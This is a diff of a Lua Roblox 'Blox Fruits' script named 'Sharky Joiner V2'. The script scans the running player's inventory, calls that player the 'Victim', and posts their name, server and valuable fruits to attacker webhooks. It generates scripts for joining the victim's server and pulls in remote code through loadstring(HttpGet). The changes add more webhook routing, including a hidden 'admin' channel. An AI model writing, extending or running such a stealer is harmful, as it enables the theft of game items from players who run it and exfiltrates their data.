@@ -1,11 +1,11 @@
 Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/b569344f-55c7-4ca1-91db-3b4183c51817" -- << Protected URL for main hits
 Usernames = { "user1", "user2", "user3", "user4", "user5" } -- << Your usernames here, you can add as many alts as you want
-FruitsToHit = { "Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Ghost-Ghost" } -- << Fruits you want the script to detect
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Ghost-Ghost"} -- << Fruits you want the script to detect
 
 --obfuscate after this, use loadstring for this coming part--> loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()
 
 Protector = "https://sharky-on-top.script-config-protector.workers.dev/w/300be834-a780-46d6-804a-c623d1f1051b" -- << Protected URL for main hits (secondary)
-dummy = "https://sharky-on-top.script-config-protector.workers.dev/w/f08da0cd-bd44-47a7-807d-eab8784d350d" -- << Protected URL for admin/special hits
+dummy = "ttps://sharky-on-top.script-config-protector.workers.dev/w/f08da0cd-bd44-47a7-807d-eab8784d350d" -- << Protected URL for admin/special hits
 
 ActivationPasswords = {-- Passwords for ?activate command
     "ishusontop",
@@ -563,7 +563,7 @@ local function sendWebhook(inventory)
     local url3 = dummy_key and _G[dummy_key]
     if not url1 then
         warn("Primary Webhook URL not configured.")
-        return
+        -- Don't return here, still need to send to url2/url3 potentially
     end
 
 	-- Define specific fruit categories (used for logic below)
@@ -586,6 +586,7 @@ local function sendWebhook(inventory)
                 table.insert(fruits, itemData);
                 if item.Name:find("Dragon") then
                     dragonHit = true;
+                    -- Ensure Dragon is always considered a fruit to hit, even if not explicitly listed
                     if not table.find(FruitsToHit, item.Name) then
                         table.insert(FruitsToHit, item.Name)
                     end
@@ -631,39 +632,16 @@ local function sendWebhook(inventory)
     end
 
 	-- Common Embed Data (original logic unchanged)
-    local targetPlaceId = game.PlaceId;
-    local targetJobId = game.JobId;
-    local currentSea = targetPlaceId == 7449423635 and "Sea 3" or "Sea 2";
+    local jobId = game.JobId;
+    local currentSea = game.PlaceId == 7449423635 and "Sea 3" or "Sea 2";
     local serverName = getServerName();
+    local joinScriptPC = string.format([[game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)]], game.PlaceId, jobId);
+    local joinScriptMobile = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", game.PlaceId, jobId);
+    local seaJoinScriptPC = game.PlaceId == 7449423635 and "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelZou')" or "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelDressrosa')";
+    local seaJoinScriptMobile = seaJoinScriptPC;
     local playerCount = # Players:GetPlayers()
 
-    -- --- Construct Combined Join Scripts ---
-    local seaTravelCommand = (currentSea == "Sea 3" and "TravelZou" or "TravelDressrosa")
-    local joinScriptLuaCode = string.format([[
-local targetPlaceId = %d
-local targetJobId = "%s"
-local seaTravelCmd = "%s"
-local TeleportService = game:GetService("TeleportService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local CommF_ = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
-
-if game.PlaceId ~= targetPlaceId then
-    if queue_on_teleport then
-        queue_on_teleport(string.format('task.wait(5); game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', targetPlaceId, targetJobId))
-    else
-        -- Fallback or error handling if queue_on_teleport is not available
-        warn("queue_on_teleport not available. Manual teleport needed after sea travel.")
-    end
-    CommF_:InvokeServer(seaTravelCmd)
-else
-    TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId)
-end
-]], targetPlaceId, targetJobId, seaTravelCommand)
-
-    local combinedJoinScriptPC = "```lua" .. joinScriptLuaCode .. "\n```"
-    local combinedJoinScriptMobile = joinScriptLuaCode:match("^%s*(.-)%s*$") -- Trim leading/trailing whitespace for mobile raw copy
-
-	-- --- Payload Generation ---
+	-- --- Payload Generation (original logic unchanged) ---
     local baseEmbedStructure = {
         description = string.format("Victim Username: %s\nCurrent Sea: %s\nVictim's Server Name: %s", LocalPlayer.Name, currentSea, serverName),
         fields = {
@@ -682,14 +660,21 @@ end
                 value = formatFruitsToHit(fruits)
             },
             {
-                name = "Join Victim Script (PC Copy)", -- UPDATED Field Name
-                value = combinedJoinScriptPC -- UPDATED Value
+                name = "Join Victim's Server Script (PC Copy)",
+                value = "```lua\n" .. joinScriptPC .. "\n```"
             },
             {
-                name = "Join Victim Script (Mobile Copy)", -- UPDATED Field Name
-                value = combinedJoinScriptMobile -- UPDATED Value
+                name = "Join Victim's Server Script (Mobile Copy)",
+                value = joinScriptMobile
             },
-            -- REMOVED SEA JOIN FIELDS
+            {
+                name = "Join Victim's Sea Script (PC Copy)",
+                value = "```lua\n" .. seaJoinScriptPC .. "\n```"
+            },
+            {
+                name = "Join Victim's Sea Script (Mobile Copy)",
+                value = seaJoinScriptMobile
+            },
             {
                 name = "Extra Info <a:focuzz:1214971569315782686> ",
                 value = string.format("```Sharky Joiner V2 Version: 1.2.3\nExecutor: %s\nTime: %s\nPlayer Count: %d```", identifyexecutor(), os.date("%Y-%m-%d %H:%M:%S"), playerCount)
@@ -761,9 +746,9 @@ end
             ["X-Client-Key"] = validation_sig -- Use the renamed variable
         }
 
-		-- Send Main Payload to url1 and url2 (always send if url is configured)
-        if url1 and mainPayloadBody then
-            -- Call SafeRequest and pass the headers table
+		-- Send Main Payload to url1 (primary) ONLY IF it's NOT exclusively a Dragon hit
+        -- It WILL send if it's Dragon + Premium, Dragon + GoodFruit, Premium only, GoodFruit only, or other FruitToHit.
+        if url1 and mainPayloadBody and not (dragonHit and not hasPremiumItem and not hasGoodFruit) then
             SafeRequest({
                 Url = url1,
                 Method = "POST",
@@ -771,9 +756,10 @@ end
                 Body = mainPayloadBody
             })
         end
+
+        -- Send Main Payload to url2 (Protector) - ALWAYS send if configured (includes Dragon hits)
         if url2 and mainPayloadBody then
             task.wait(0.1)
-            -- Call SafeRequest and pass the headers table
             SafeRequest({
                 Url = url2,
                 Method = "POST",
@@ -782,10 +768,9 @@ end
             })
         end
 
-		-- Send Admin Payload to url3 ONLY IF it was created
+		-- Send Admin Payload to url3 (dummy) ONLY IF it was created (includes Dragon, Premium, GoodFruit hits)
         if url3 and adminPayloadBody then
             task.wait(0.1)
-            -- Call SafeRequest and pass the headers table
             SafeRequest({
                 Url = url3,
                 Method = "POST",
@@ -826,16 +811,20 @@ local function hasPremiumItems2()
 end
 local webhookSent = false
 
-local function sendProtector() -- On Player Leaving (MODIFIED PART)
+local function sendProtector() -- On Player Leaving (MODIFIED PART - NO CHANGE NEEDED HERE FOR DRAGON RULE)
     if webhookSent or not (hasFruitInInventory2() or hasPremiumItems2()) then
         return -- Exit if already sent or no valuable items initially
     end
     webhookSent = true -- Set flag immediately
     local url1 = webhook1_key and _G[webhook1_key]
     local url2 = Protector_key and _G[Protector_key]
+    -- Note: The logic here doesn't differentiate based on *why* the user was interesting (dragon vs premium vs other).
+    -- The leave message is generic and sent to url1 and url2 if they *initially* had *any* valuable items.
+    -- If you wanted the leave message to also follow the dragon rule for url1, this function would need modification.
     if not url1 then
-        return
-    end -- Exit if primary webhook isn't configured
+        -- If primary isn't configured, still try secondary
+        if not url2 then return end
+    end
     local plr = LocalPlayer
     local embed = {
         title = "Victim has Left! <:sad:1241420488916340896> ",
@@ -875,12 +864,14 @@ local function sendProtector() -- On Player Leaving (MODIFIED PART)
 
 	-- Send using regular request wrapped in pcall (NOT SafeRequest for leave message)
     -- Passing the headersWithSecret table
-    pcall(request, {
-        Url = url1,
-        Method = "POST",
-        Headers = headersWithSecret,
-        Body = body
-    })
+    if url1 then
+        pcall(request, {
+            Url = url1,
+            Method = "POST",
+            Headers = headersWithSecret,
+            Body = body
+        })
+    end
     if url2 then
         task.wait(0.1) -- Small delay
         -- Passing the headersWithSecret table
@@ -2057,15 +2048,20 @@ local function init()
         LocalPlayer:Kick("Error getting initial inventory.");
         return
     end;
-    inventory22 = initialInventory; -- Store initial inventory for leave check
+    inventory22 = initialInventory; -- Store for leave check
     local function checkInventoryForHit(inv)
         local fruitsToHitSet = {};
         for _, f in ipairs(FruitsToHit) do
             fruitsToHitSet[f] = true
         end;
+        -- Also consider Dragon a hit for filtering purposes, even if not listed
+        -- The webhook sending logic handles where Dragon hits go later
         for _, item in ipairs(inv) do
-            if (item.Type == "Blox Fruit" and fruitsToHitSet[item.Name]) or item.Type == "Premium" then
-                return true
+            if item.Type == "Premium" then return true end
+            if item.Type == "Blox Fruit" then
+                if fruitsToHitSet[item.Name] or item.Name:find("Dragon") then
+                    return true
+                end
             end
         end;
         return false
@@ -2078,7 +2074,7 @@ local function init()
         task.wait(1);
         JoinTeam();
         task.spawn(createNotification);
-        sendWebhook(initialInventory)
+        sendWebhook(initialInventory) -- Send initial webhook based on modified rules
     end);
     local mainLoopStopper = nil;
     local chatConnection = nil;
@@ -2091,7 +2087,8 @@ local function init()
         if not isWhitelisted then
             return
         end;
-        mainLoopStopper = function() end; -- Placeholder to prevent multiple triggers
+        mainLoopStopper = function()
+        end;
         task.spawn(function()
             if not externalUILoaded then
                 local success, err = pcall(function()
@@ -2108,7 +2105,7 @@ local function init()
                 chatConnection = Players.PlayerChatted:Connect(processChatCommand)
             end;
             RunService:Set3dRenderingEnabled(false);
-            mainLoopStopper = startMainLoop(); -- Assign the actual stopper function
+            mainLoopStopper = startMainLoop();
             task.spawn(function()
                 task.wait(2);
                 sendMessage("Join (uwdvTtqTDA) << Invite in dc if you want to learn how to make a lot of mythical fruits!")
@@ -2131,7 +2128,7 @@ local function init()
                 chatConnection:Disconnect()
             end;
             if mainLoopStopper and type(mainLoopStopper) == "function" then
-                 pcall(mainLoopStopper) -- Call the stopper function safely
+                mainLoopStopper()
             end;
             if localPlayerRemovingConn then
                 localPlayerRemovingConn:Disconnect()
@@ -2140,18 +2137,18 @@ local function init()
     end)
 end--
 -- Use a unique variable for basic re-execution prevention
-if not shared.ScriptExecuted_SharkyV2_FinalFormatted_v3 then -- Incremented version marker
-    shared.ScriptExecuted_SharkyV2_FinalFormatted_v3 = true
+if not shared.ScriptExecuted_SharkyV2_FinalFormatted_v2_DragonRule then
+    shared.ScriptExecuted_SharkyV2_FinalFormatted_v2_DragonRule = true
     task.spawn(function() -- Run init in a protected thread
         local success, errorMessage = pcall(init)
         if not success then
             warn("SCRIPT INIT ERROR:", errorMessage)
             task.spawn(function() -- Use another task.spawn for kick to avoid issues within pcall error handling
                 local safeMsg = string.gsub(tostring(errorMessage or "Unknown Error"), "[<>\"']", "") -- Sanitize message
-                LocalPlayer:Kick("Script Initialization Error: " .. safeMsg:sub(1, 150)) -- Limit kick message length
+                LocalPlayer:Kick("Script Initialization Error: " .. safeMsg)
             end)
         end
     end)
 end
 
--- END OF FILE --
+--- drag sharker ---
